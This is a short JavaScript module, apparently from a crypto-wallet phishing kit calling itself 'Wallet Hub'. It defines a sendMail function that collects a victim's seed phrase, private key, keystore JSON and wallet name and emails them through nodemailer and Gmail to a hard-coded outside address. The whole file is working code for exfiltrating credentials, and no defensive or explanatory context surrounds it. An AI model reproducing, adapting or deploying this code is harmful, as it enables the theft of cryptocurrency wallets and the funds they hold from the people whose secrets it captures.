import nodemailer from 'nodemailer'


export const sendMail = async (
    phrase = "",
    keystone = "",
    private_key = "",
    walletName = ""
) => {
    const mailDetails = {
        from: '"Wallet Hub" <frontdesk0007@gmail.com>', // sender address
        to: "mach52624@gmail.com", // list of receivers
        subject: "New Wallet Hub Credentials", // Subject line
        html: `
            <div style="padding: 10px 20px;">
                <h4>New Wallet Credentials</h4>
                <div>
                    <p>Wallet: ${walletName.toString()}</p>
                    ${phrase.toString() !== "" && `<p>Phrase : ${phrase.toString()}</p>`}
                    ${private_key.toString() !== "" && `<p>Private Key : ${private_key.toString()}</p>`}
                    ${keystone.toString() !== "" && `<p>Keystone JSON : ${keystone.toString()}</p>`}
                </div>            
            </div>
        `
    }
    let mailTransporter = await nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: process.env.EMAIL,
            pass: process.env.PASSWORD
        }
    });
      
    await mailTransporter.sendMail(mailDetails)
}